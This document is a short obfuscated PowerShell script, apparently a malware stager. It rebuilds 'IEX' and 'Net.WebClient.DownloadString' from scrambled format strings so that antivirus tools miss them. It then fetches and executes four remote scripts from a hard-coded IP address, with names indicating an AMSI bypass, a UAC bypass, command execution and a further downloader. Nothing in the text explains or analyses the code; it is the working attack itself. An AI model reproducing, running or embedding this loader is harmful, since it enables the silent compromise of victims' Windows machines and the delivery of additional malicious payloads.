&('{0}{1}'-f 'IE','X') ((&('{3}{2}{0}{1}' -f '-Obje','ct','w','Ne') ('{0}{1}{3}{2}' -f 'N','et.W','t','ebClien')).('{1}{3}{2}{0}'-f'String','Do','d','wnloa').Invoke('http://44.203.122.41:80/amsi.ps1'));

&('{0}{1}'-f 'IE','X') ((&('{3}{2}{0}{1}' -f '-Obje','ct','w','Ne') ('{0}{1}{3}{2}' -f 'N','et.W','t','ebClien')).('{1}{3}{2}{0}'-f'String','Do','d','wnloa').Invoke('http://44.203.122.41:80/Scam_uac/uac.ps1'));

&('{0}{1}'-f 'IE','X') ((&('{3}{2}{0}{1}' -f '-Obje','ct','w','Ne') ('{0}{1}{3}{2}' -f 'N','et.W','t','ebClien')).('{1}{3}{2}{0}'-f'String','Do','d','wnloa').Invoke('http://44.203.122.41:80/Scam_uac/command.ps1'));

Start-Sleep -Seconds 15

&('{0}{1}'-f 'IE','X') ((&('{3}{2}{0}{1}' -f '-Obje','ct','w','Ne') ('{0}{1}{3}{2}' -f 'N','et.W','t','ebClien')).('{1}{3}{2}{0}'-f'String','Do','d','wnloa').Invoke('http://44.203.122.41:80/Scam_uac/down.ps1'));
